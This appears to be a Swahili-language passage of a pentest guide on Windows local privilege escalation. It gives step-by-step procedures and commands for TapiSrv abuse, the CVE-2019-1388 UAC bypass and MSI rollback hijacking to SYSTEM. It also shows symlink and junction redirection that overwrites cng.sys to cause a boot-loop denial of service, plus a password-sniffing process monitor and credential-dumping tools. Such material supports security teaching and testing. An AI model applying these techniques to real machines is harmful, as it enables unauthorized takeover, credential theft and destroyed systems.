Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client wa mbali aliye-authenticated anaweza kutumia vibaya njia ya async event inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** wa kiholela kwenye faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL ya kiholela kama huduma. Mtiririko kamili:

- `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kuwa path iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa async event.
- Kila event huandika `InitContext` inayodhibitiwa na attacker kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata data kupitia `GetAsyncEvents` (`Req_Func 0`), kisha iondoe usajili/zima ili kurudia maandishi kwa namna inayotabirika.
- Jiunge na `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha uite `GetUIDllName` ukiwa na path ya DLL ya kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### File Extensions zinazoweza kutekeleza vitu katika Windows

Angalia ukurasa wa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Markdown links zinazoweza kubofyekwa na kutumwa kwa `ShellExecuteExW` zinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na attacker kama mtumiaji wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines kwa nywila**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazotekelezwa ambazo **huweka credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile iliyotangulia, kisha kuonyesha tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji Mwenye Haki Chache hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminali au mchakato mwingine wowote, kama "NT\AUTHORITY SYSTEM", kutoka kwa akaunti ya mtumiaji asiye na haki za juu.

Hii huwezesha kupandisha viwango vya ruhusa na kukwepa UAC kwa wakati mmoja, kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit vulnerability hii, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na maelezo yote yanayohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuelekeza Junction za Saraka za Upakiaji kwenye Saraka Inayotolewa na Seva

Programu inaweza kuunda saraka ndogo ya upakiaji inayotabirika, kuandika humo jina la faili lililotolewa na mtumiaji, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye ruhusa ndogo anaweza kuondoa na kubadilisha saraka hiyo ndogo na NTFS junction kabla ya uandishi wa upande wa seva, uandishi unaweza kuelekezwa kupitia junction hadi kwenye saraka inayotolewa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa seva inaendesha aina hiyo ya faili. Huu ni mpaka wa arbitrary-write unaotegemea programu maalum; saraka ya upakiaji inayoweza kuandikwa au junction iliyopo pekee havithibitishi uwezekano huo.

Kagua uundaji halisi wa njia na muda unaotumika katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda saraka ndogo, ACLs halisi za mahali pa kulengwa, kama mchakato wa kuandika hufuata reparse points, na kama web server inaendesha faili katika eneo hilo. Thibitisha utambulisho wa michakato ya mchakato wa kuandika na web server kando. Ukaguzi usioingilia unaweza kuonyesha ACLs za saraka na metadata ya reparse, lakini hauwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanywa baadaye. Ikiwa utekelezaji unafanyika kwa akaunti ya huduma, kagua **token halisi ya mchakato** kabla ya kuchunguza njia nyingine ya token-privilege.

## Kutoka kwenye Ruhusa za Kufuta/Kuhamisha/Kubadilisha Jina la Folda Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na msimbo wa exploit [**unaopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili hutumia vibaya kipengele cha Windows Installer cha kurejesha mabadiliko (rollback) ili kubadilisha faili halali na kuweka faili hasidi wakati wa mchakato wa uondoaji. Ili kufanya hivyo, mshambulizi anahitaji kuunda **MSI installer hasidi** itakayotumiwa kuteka nyara folda ya `C:\Config.Msi`, ambayo Windows Installer itatumia baadaye kuhifadhi faili za rollback wakati wa kuondoa vifurushi vingine vya MSI. Faili za rollback zitakuwa zimebadilishwa ili ziwe na payload hasidi.

Muhtasari wa mbinu hii ni huu:

1. **Hatua ya 1 – Kuandaa Kuteka Nyara (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folda inayoweza kuandikwa (`TARGETDIR`).
    - Weka alama kuwa installer **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ya faili ikiwa wazi baada ya usakinishaji.

- Hatua ya 2: Anza Kuondoa
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa kuondoa huanza kuhamisha faili hadi `C:\Config.Msi` na kuyabadilisha majina kuwa faili za `.rbf` (nakala rudufu za rollback).
    - **Fuatilia handle ya faili iliyo wazi** ukitumia `GetFinalPathNameByHandle` ili kutambua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutuma ishara faili ya `.rbf` inapoandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uondoaji.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitumwa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia faili kufutwa**.
    - Kisha **tuma ishara ya jibu** ili uondoaji uendelee.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambulizi) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa nyara.

> Katika hatua hii, **anzisha udhaifu wa kufuta folda yoyote kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts na Kuweka Zilizo Hasidi**

- Hatua ya 6: Unda Upya `C:\Config.Msi` kwa ACLs Dhaifu
    - Unda upya folda ya `C:\Config.Msi` wewe mwenyewe.
    - Weka **DACLs dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikwa.
        - `ERROROUT`: Kigezo kinachosababisha hitilafu ya kulazimishwa.
    - Usakinishaji huu utatumika kuanzisha tena **rollback**, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi faili mpya ya `.rbs` itokee.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutuma ishara ya tukio faili ya `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `'.rbs created'`:
        - Windows Installer **huweka tena ACLs imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACLs dhaifu**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folda.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` ili iwe na **rollback script bandia** inayoiambia Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye ruhusa za juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **payload DLL hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya tukio la usawazishaji ili installer iendelee.
    - **Type 19 custom action (`ErrorOut`)** imewekwa ili **kufeli usakinishaji kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` hadi mahali palipolengwa.
    - Sasa una **DLL yako hasidi kwenye njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Msimbo wa SYSTEM
    - Endesha **auto-elevated binary** inayoaminika (kwa mfano, `osk.exe`) inayopakia DLL uliyotekea nyara.
    - **Basi**: Msimbo wako unaendeshwa **kama SYSTEM**.


### Kutoka kwenye Ruhusa za Kufuta/Kuhamisha/Kubadilisha Jina la Faili Yoyote hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) inadhania kuwa unaweza kufuta **folda nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu **kufuta faili yoyote** pekee?

Unaweza kutumia vibaya **ndani ya NTFS**: kila folda ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hivyo, ukifuta **stream ya `::$INDEX_ALLOCATION`** ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, inafuta **folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako hairuhusu kufuta file/folder yoyote kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** mchakato wenye privileged unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (k.m., `SilentCleanup`)
- Mchakato huu huchanganua folda (k.m., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock — elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huacha `folder1` ikiwa tupu bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock kabla ya wakati.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — ukiufuta, folda hufutika.

5. Hatua ya 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uundaji wa Folda Yoyote hadi DoS ya Kudumu

Tumia primitive inayokuwezesha **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode ya `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda, hushindwa kutambua driver halisi, na mfumo huanguka au kuwasha hukwama.
- Hakuna njia mbadala wala urejeshaji bila uingiliaji wa nje (kwa mfano, ukarabati wa kuwasha au ufikiaji wa diski).

### Kutoka njia za logi/chelezo zenye ruhusa za juu + viungo vya ishara vya OM hadi kubadilisha faili yoyote / DoS ya kuwasha

Huduma yenye ruhusa za juu inapoandika logi/matokeo kwenye njia iliyosomwa kutoka kwenye config inayoweza kuandikwa, elekeza upya njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi huo wenye ruhusa za juu kuwa ubadilishaji wa faili yoyote (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Kitendo chenye ruhusa za juu kinachoandika kwenye njia hiyo (logi, export, ripoti).

**Mlolongo wa mfano**
1. Soma config ili kupata mahali pa logi yenye ruhusa za juu, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia bila ruhusa za msimamizi:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye haki za juu iandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa upya (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia njia ya driver iliyobadilishwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo huduma yenye haki za juu itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa kuna nakala katika `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa sinki la DoS la kuaminika kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kwenda SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza huduma mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapounda binary ya service, hakikisha ni service halali au binary inatekeleza haraka hatua zinazohitajika, kwani itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwa process yenye High Integrity unaweza kujaribu **kuwasha entries za registry za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha package ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi Full Token privileges

Ikiwa una token privileges hizo (huenda ukazipata kwenye process iliyo tayari na High Integrity), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii inatumiwa na meterpreter kufanya privilege escalation kwenye `getsystem`. Mbinu hii inahusisha **kuunda pipe kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service), na kupata SYSTEM privileges.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ikiwa ungependa kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayopakiwa na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na pia ni **rahisi zaidi kutekeleza kutoka kwenye process yenye high integrity**, kwa kuwa itakuwa na **write permissions** kwenye folders zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora zaidi ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na files nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za sessions zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mashine ya ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hueneza passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta privesc vulnerabilities zinazojulikana (IMEACHWA kwa ajili ya Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Inahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta privesc vulnerabilities zinazojulikana (inahitaji kucompile kwa kutumia VisualStudio) ([**imecompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host kutafuta misconfigurations (ni zaidi ya tool ya kukusanya taarifa kuliko privesc) (inahitaji kucompile) **(**[**imecompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompilewa awali inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompilewa awali inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji kucompile project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing kupitia SMTP → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya Usalama katika Mfumo wa Faili wenye Privileges katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kujaribu Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi Hatari wa Moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za C/C++ checklist, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own pamoja na Microslop: Kuunganisha Masharti ya Race ya CLDFLT na DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive Kamili ya Exploit ya Kusoma/Kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji wa Faili Zisizobainishwa ili Kuongeza Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
